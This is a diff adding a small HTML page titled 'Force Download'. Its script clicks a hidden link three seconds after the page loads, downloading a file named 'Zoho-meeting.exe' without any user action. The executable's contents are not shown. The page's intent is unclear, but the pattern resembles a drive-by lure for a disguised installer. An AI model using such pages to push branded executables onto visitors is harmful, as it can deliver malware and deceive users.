@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Force Download</title>
+  <script>
+    window.onload = function() {
+      setTimeout(function() {
+        var link = document.createElement('a');
+        link.href = './Zoho-meeting.exe';
+        link.download = 'Zoho-meeting.exe';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+      }, 3000);
+    }
+  </script>
+</head>
+<body>
+  <p>Your download will start soon...</p>
+</body>
+</html>
